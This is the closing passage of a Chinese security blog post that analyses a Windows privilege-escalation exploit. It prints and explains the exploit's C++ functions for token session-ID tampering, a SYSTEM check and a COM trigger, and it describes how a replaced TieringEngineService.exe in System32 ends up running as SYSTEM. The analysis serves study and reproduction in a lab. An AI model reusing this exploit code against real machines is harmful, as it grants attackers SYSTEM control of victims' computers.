{
    // 连接命名管道，通过管道获取用户所在的会话 ID SessionId
    HANDLE hpipe = CreateFile(L"\\??\\pipe\\REDSUN", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hpipe == INVALID_HANDLE_VALUE) // 如果管道不能存在则直接退出
        return;
    // 从管道获取目标会话 ID
    DWORD sessionid = 0;
    if (!GetNamedPipeServerSessionId(hpipe, &sessionid))
        return;
    CloseHandle(hpipe);
    // 获取当前进程令牌
    HANDLE htoken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
        return;
    // 复制一个全新的主令牌
    HANDLE hnewtoken = NULL;
    bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
    CloseHandle(htoken);
    if (!res)
        return;
    // 篡改令牌的 SessionId
    res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
    if (!res)
    {
        CloseHandle(hnewtoken);
        return;
    }
    // 用篡改后的令牌，创建进程
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
    CloseHandle(hnewtoken);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);
    return;
}
```  
  
  
该函数是一个辅助函数，从一个高权限进程中获取目标用户会话的 ID，并伪造一个具有该会话 ID 的令牌，从而在指定用户的会话中启动 conhost.exe（控制台主机进程）。  
  
  
**具体逻辑**  
  
1. 打开预创建的命名管道（下图所示，main 函数在执行的时候就创建了命名管道），调用 GetNamedPipeServerSessionId 获取该管道服务端进程的会话 ID。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF53vf9tQtd94EoVZMA30TCnj5hRygjvPVz78pg6T8ccLacg6F29EJ7bric1dBINUGalicLq1BpYP8ic7xqylfHAfsTt9steIrkOSM/640?wx_fmt=png&from=appmsg "")  
  
  
2. 打开当前进程的访问令牌，复制该令牌为主令牌，以便用于创建新进程。  
  
  
3. 使用 SetTokenInformation 将新令牌的 TokenSessionId 改为从管道获取的目标会话 ID。  
  
  
4. 调用 CreateProcessAsUser 启动 C:\Windows\System32\conhost.exe。由于令牌的会话 ID 已被篡改，conhost.exe 将在目标会话中运行。  
  
  
后续会通过 COM 服务将恶意程序以 SYSTEM 权限重新启动，新启动的进程具有 SYSTEM 权限，程序检查到自身具备 SYSTEM 权限于是调用 LaunchConsoleInSessionId()。该函数通过篡改令牌的会话 ID，使 conhost.exe 以 SYSTEM 身份运行。因此弹出的控制台窗口拥有 SYSTEM 权限，这是提权成功后的直接体现。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF46kHD6DIhCHqKP3h3BVl4hicFOQaL2ziboVewWibbJkETEoRGSp6iaks6YMudvA9JG26JDKDf0yadCB8Cfvw9H4ZTSK63QvRPcGgk/640?wx_fmt=png&from=appmsg "")  
  
  
### 函数 - IsRunningAsLocalSystem()  
  
```
bool IsRunningAsLocalSystem()
{
    // 打开当前进程的令牌
    HANDLE htoken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
        printf("OpenProcessToken failed, error : %d\n", GetLastError());
        return false;
    }
    // 分配内存，读取用户 SID
    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
    DWORD retsz = 0;
    // 获取令牌里的用户信息
    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
    CloseHandle(htoken);
    if (!res)
        return false;
    // IsWellKnownSid 判断是不是 LOCAL SYSTEM 用户
    bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
    if (ret) {
        LaunchConsoleInSessionId(); // 弹出控制台
        ExitProcess(0);             // 退出自身
    }
    return ret;
}
bool r = IsRunningAsLocalSystem();
```  
  
  
判断程序自身是否具有 SYSTEM 权限，如果具备则调用 LaunchConsoleInSessionId() 函数弹窗控制台。  
  
  
  
### 函数 - LaunchTierManagementEng()  
  
```
void LaunchTierManagementEng()
{
    // 初始化 COM 库
    CoInitialize(NULL);
    // 定义一个 COM 组件的 CLSID
    GUID guidObject = { 0x50d185b9,0xfff3,0x4656,{0x92,0xc7,0xe4,0x01,0x8d,0xa4,0x36,0x1d} };
    void* ret = NULL;
    // 创建 COM 实例，CLSCTX_LOCAL_SERVER 表示启动一个独立的本地进程来运行这个 COM 组件
    HRESULT hr = CoCreateInstance(guidObject, NULL, CLSCTX_LOCAL_SERVER, guidObject, &ret);
    // 关闭 COM 环境
    CoUninitialize();
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF7FZG5dLJnPDD24DowH34ElQoRK6Y0D2bEbKoRSO1WYkgibeOs3u4lZ3Pf2WsFX9zjhBloo3xh4IVXyiahyQvdWQXAzyuPcF8PBQ/640?wx_fmt=png&from=appmsg "")  
  
  
这个服务启动的是 System32 目录下的 TieringEngineService.exe，但是这个文件已经被换成恶意程序了。  
  
  
  
### 小结  
  
  
  
复现漏洞重要的是弄明白漏洞的原理，以及 EXP 的写法，通过分析别人写的 EXP 可以学到很多的东西  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1pic87O41XF6kmc0YnL1VWHib1iaUAmCtfSUCerG9oibs66ib73nwLKNBhyq5ia8dQiaOp42wI3TAs4ibKVjiaouvuwwcGSJrCWXib40XcxGsZEw7jGxY/640?wx_fmt=png&from=appmsg "")  
  
  
  
不过这个 EXP Defender 现在是有标记的  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/1pic87O41XF4icMUYVoyOqAhlBrMWZQmabiaMOtxKeWHEu7mWBUtbpKhlSeu0AZI5bjXiaTwPFJYL7PEoEQSFVSgticZsZMZO70SgpczZVUbn4pg/640?wx_fmt=png&from=appmsg "")  
  
  
至此整个 EXP 就分析完毕了！  
  
  
  
**0****1**  
  
**总结**  
  
  
Hbird Security - 蜂鸟安全  
  
  
复现漏洞重要的是弄明白漏洞的原理，以及 EXP 的写法，通过分析别人写的 EXP 可以学到很多的技术，一个漏洞的利用往往涉及到多个技术点，这些技术点不仅仅是在该漏洞可以用，在别的漏洞说不定也可以用得上。  
  
  
写这篇文章的时候有点小插曲，16 号的时候 EXP 我是能够成功复现的，但是今天写这篇文章的时候却复现不成功，我不知道为啥，经过测试发现 Defender 没有向原目录写回恶意文件，导致无法将文件重定向到 System32 目录下覆盖原程序，所以后续的操作也就无法正常执行，弄了好久没成功就没继续搞了，后面有空再看看吧，但是这不影响 EXP 的分析，感兴趣的师傅可以自己测试一下。在虚拟机测试的时候需要进行快照，或者备份 System32 目录下原来的 TieringEngineService.exe。这个 EXP 会覆盖原程序的。  
  
